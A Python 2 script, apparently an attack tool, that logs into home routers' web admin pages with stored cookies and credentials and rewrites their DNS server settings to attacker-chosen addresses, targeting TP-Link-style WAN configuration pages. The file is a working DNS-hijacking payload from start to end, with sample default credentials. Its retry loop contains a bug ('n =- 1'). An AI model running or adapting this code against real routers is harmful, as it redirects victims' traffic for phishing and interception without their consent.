#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: tan
# @Date:   2015-08-21 16:47:23
# @Last Modified by:   tan
# @Last Modified time: 2015-08-21 19:37:00

import requests
import re
import sys
import base64
from sqlite_helper import DataCondition
from sqlite_helper import DataHelper

class DNSPayload(object):
    """Automatic change routers' dns settings
       自动切换路由器DNS地址
    """
    def __init__(self, addr, port, username, passwd, id):
        self.addr = addr
        self.port = port
        self.username = username
        self.passwd = passwd
        self.id = id
        self.db = DataHelper('./testDB.db')
        self.db.open()
        self.connec_session = requests.session()
        rs = self.db.table("INFO_MATCH").select('OTHER_COOKIE', 'AUTH_COOKIE').where(DataCondition(("=", "AND"), ID = self.id)).fetchone()
        self.headers = {
                b'User-Agent': b'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0', 
                b'Accept-Language': b'en-US',
                b'Referer': '',
                b'Cookie': rs[0] + rs[1] + base64.b64encode(self.username + ':' + self.passwd) 
            }

    def connect_times(self, url, times = 3):
        n = times
        while (n > 0):
            try:
                print url
                print self.headers
                r = self.connec_session.get(url, auth = (self.username, self.passwd) , 
                    timeout = 3, allow_redirects = True, headers = self.headers)
                return r
            except Exception, e:
                n =- 1
        print 'connect timeout'



    def dns_seting(self, dns1, dns2):
        rs = self.db.table('DNS_PAYLOAD').select('HRE_URL', 'DYNA_PARA', 'PPP_PARA', 'DYNA_REF', 'PPP_REF').where(DataCondition(("=", "AND"), ID = self.id)).fetchone()
        self.hre_url = rs[0]
        self.dyna_para = rs[1]
        self.ppp_para = rs[2]
        self.dyna_ref = rs[3]
        self.ppp_ref = rs[4]
        self.db.close()

        self.base_url = 'http://' + self.addr + ':' + str(self.port)
        self.headers['Referer'] = self.base_url
        self.href = self.base_url + self.hre_url
        r = self.connect_times(self.href)
        if r == None:
            return
        ref_re = 'location.href="(.+?)"'
        ref_re_index = 1
        ref_pattern = re.compile(ref_re, re.I)
        match = ref_pattern.search(r.content)
        if match:
            wan_url = self.base_url + match.group(ref_re_index)
        else:
            print 'can not find the wan_url'
            return

        if (wan_url.find('WanDynamicIpCfgRpm') > 0):
            payload = self.dyna_payload(dns1, dns2)
        elif (wan_url.find('PPPoECfgAdvRpm') > 0):
            payload = self.ppp_payload(dns1, dns2)
        else:
            print "can not find the dns change method in this router"
            return

        dns_url = wan_url + payload
        r = self.connect_times(dns_url)
        if r == None:
            return
        if (r.content.find(dns1) != -1):
            print 'success'
        else:
            print r.content
            print 'change dns fail'

    def dyna_payload(self, dns1, dns2):
        self.headers['Referer'] = self.base_url + self.dyna_ref
        payload = self.dyna_para.replace('[dns1]', dns1)
        payload = payload.replace('[dns2]', dns2)
        return payload

    def ppp_payload(self, dns1, dns2):
        self.headers['Referer'] = self.base_url+ self.ppp_ref
        payload = self.ppp_para.replace('[dns1]', dns1)
        payload = payload.replace('[dns2]', dns2)
        return payload

if __name__ == '__main__':
    dns_payload = DNSPayload('192.168.1.253', 80, 'admin', '123456', 0)
    dns_payload.dns_seting('192.168.1.1', '192.168.2.2')


        